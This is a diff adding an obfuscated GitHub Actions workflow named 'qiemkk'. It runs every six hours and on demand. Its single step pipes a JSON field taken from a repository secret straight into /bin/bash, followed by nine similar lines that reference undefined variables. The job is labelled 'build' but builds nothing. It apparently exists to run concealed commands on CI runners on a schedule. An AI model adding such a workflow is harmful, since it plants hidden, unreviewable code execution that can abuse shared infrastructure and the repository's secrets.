@@ -1,0 +1,28 @@
+name: qiemkk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiemkk
+        env:
+          hlbl5: ${{ secrets.hlbl5 }}
+        run: |
+          echo $hlbl5 | jq -r .tk8 | /bin/bash
+          echo $dfqf68 | jq -r .ayf80678 | /bin/bash
+          echo $anyw9 | jq -r .wvn39312 | /bin/bash
+          echo $hx48 | jq -r .bwjdf38 | /bin/bash
+          echo $et009 | jq -r .mg57 | /bin/bash
+          echo $jl8089 | jq -r .hnht195 | /bin/bash
+          echo $bk229 | jq -r .bgs98 | /bin/bash
+          echo $go73 | jq -r .c32 | /bin/bash
+          echo $eks7 | jq -r .zlk6272 | /bin/bash
+          echo $ti4 | jq -r .yuj32220 | /bin/bash
+
